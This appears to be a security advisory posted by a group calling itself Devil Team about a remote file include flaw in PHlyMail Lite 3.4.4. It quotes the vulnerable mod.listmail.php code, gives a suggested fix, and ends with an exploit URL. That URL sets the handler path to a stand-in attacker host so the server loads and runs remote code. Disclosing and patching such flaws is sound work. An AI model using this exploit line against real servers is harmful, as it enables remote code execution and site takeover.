PHlyMail Lite <= 3.4.4 (mod.listmail.php) Remote Include Vulnerability
======================================================================



/*
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- PHlyMail Lite <= 3.4.4 (Build 3.04.04) [_PM_[path][handler]] Remote File Include Vulnerability
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- [Script name: PHlyMail Lite v. 3.4.4 (Build 3.04.04)
- [Script site: http://phlymail.de/
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-          Find by: Kacper (a.k.a Rahim)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
- Special Greetz: DragonHeart ;-)
- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi
-
!@ Przyjazni nie da sie zamienic na marne kozysci @!
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
-            Z Dedykacja dla osoby,
-         bez ktorej nie mogl bym zyc...
-           K.C:* J.M (a.k.a Magaja)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
*/
/*
+++++++++++++++++++++START+++++++++++++++++++++++
vulnerable code => handlers/email/mod.listmail.php line 12-25:
....

$ordfields = array
       (&#039;hfrom&#039;, &#039;hto&#039;, &#039;hcc&#039;, &#039;hbcc&#039;, &#039;hsubject&#039;, &#039;hdate_recv&#039;, &#039;hdate_sent&#039;, &#039;hsize&#039;, &#039;hpriority&#039;
       ,&#039;attachments&#039;, &#039;meta_read&#039;, &#039;meta_type&#039;, &#039;meta_colour&#039;
       );
require_once($_PM_[&#039;path&#039;][&#039;handler&#039;].&#039;/&#039;.$_REQUEST[&#039;handler&#039;].&#039;/fs.php&#039;);
require_once($_PM_[&#039;path&#039;][&#039;lib&#039;].&#039;/phm_streaming_mailparser.php&#039;);

// We changed the folder, got to reset the page number to 0
if (isset($_REQUEST[&#039;workfolder&#039;]) && isset($_SESSION[&#039;workfolder&#039;])
       && $_REQUEST[&#039;workfolder&#039;] != $_SESSION[&#039;workfolder&#039;]) {
   $_SESSION[&#039;WPs_pagenum&#039;] = 0;
}
....
+++++++++++++++++++++++++++++++++++++++++++++++++
*/
/*
+++++++++++++++++++++FIX+++++++++++++++++++++++++
handlers/email/mod.listmail.php line 12-25:
Add Line1:
....
if (!defined(&#039;_IN_PHM_&#039;)) die();
....

$ordfields = array
       (&#039;hfrom&#039;, &#039;hto&#039;, &#039;hcc&#039;, &#039;hbcc&#039;, &#039;hsubject&#039;, &#039;hdate_recv&#039;, &#039;hdate_sent&#039;, &#039;hsize&#039;, &#039;hpriority&#039;
       ,&#039;attachments&#039;, &#039;meta_read&#039;, &#039;meta_type&#039;, &#039;meta_colour&#039;
       );
require_once($_PM_[&#039;path&#039;][&#039;handler&#039;].&#039;/&#039;.$_REQUEST[&#039;handler&#039;].&#039;/fs.php&#039;);
require_once($_PM_[&#039;path&#039;][&#039;lib&#039;].&#039;/phm_streaming_mailparser.php&#039;);

// We changed the folder, got to reset the page number to 0
if (isset($_REQUEST[&#039;workfolder&#039;]) && isset($_SESSION[&#039;workfolder&#039;])
       && $_REQUEST[&#039;workfolder&#039;] != $_SESSION[&#039;workfolder&#039;]) {
   $_SESSION[&#039;WPs_pagenum&#039;] = 0;
}
....
++++++++++++++++++++THE+END++++++++++++++++++++++
*/
#Exploit:

http://www.site.com/[phlymail_path]/handlers/email/mod.listmail.php?_PM_[path][handler]=[http://www.myevilsite.com/evil_scripts.txt]




